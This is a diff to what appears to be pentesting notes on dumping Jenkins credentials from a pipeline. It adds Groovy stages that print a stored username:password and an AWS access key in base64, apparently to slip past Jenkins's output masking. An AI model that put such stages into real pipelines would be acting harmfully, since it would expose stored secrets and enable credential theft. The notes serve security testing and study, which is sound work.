@@ -13,36 +13,38 @@
 
 ## Credentials Dumping from pipeline
 
-
+- We can store various kinds of credentials in Jenkins ( username:password, AWS credential, secret file, secret text, Github credentials, certificate )
+- The withCredentials() function can pass the credential id for the required secret and that credential will be available as an environment variable.
+- If there are some global credentials or credentials for the current project scope we can dump them. 
+- It is important to know the name of the parameter, and if you have guessed correctly we can get the parameter id from here ( http://host:ip/credentials/ )
 - Credentials Bindings ( https://www.jenkins.io/doc/pipeline/steps/credentials-binding/ )
+
+- Dumping Username:Password
 ``` Groovy
-stages {
-        stage('Curl') {
+stage('Credential Dumping') {
             steps {
-                withCredentials(
-                    [usernamePassword(credentialsId: 'mycredentials', usernameVariable: 'user', passwordVariable : 'pass')]
+                 withCredentials(
+                    [usernameColonPassword(credentialsId: '3b258e73-5e16-4338-883e-7a24927aefe1', variable: 'USERPASS')]
                 ) {
                     sh '''
-                        echo "$pass" | base64
+                        echo "$USERPASS" | base64
                     '''
                 }
             }
         }
 ```
-- When used without base64
+- Dumping AWS Keys ( References : https://stackoverflow.com/questions/53859575/jenkinsfile-access-aws-credentials )
 ```
-[Pipeline] stage
-[Pipeline] { (Curl)
-[Pipeline] withCredentials
-Masking supported pattern matches of $user or $pass
-[Pipeline] {
-[Pipeline] sh
-+ echo ****
-****
-[Pipeline] }
-[Pipeline] // withCredentials
-[Pipeline] }
-[Pipeline] // stage
-```
+        stage('Credential Dumping') {
+            steps {
+                 withCredentials([[$class: 'AmazonWebServicesCredentialsBinding',credentialsId: "8ada641e-429c-4547-9921-a1581dbf86ef",accessKeyVariable: 'AWS_ACCESS_KEY_ID',secretKeyVariable: 'AWS_SECRET_ACCESS_KEY'
+]]) {
+                    sh '''
+                        echo "$AWS_ACCESS_KEY_ID" | base64
+                    '''
+                }
+            }
+        }
+```        
 
 ## Credentials Dumping from Script Console
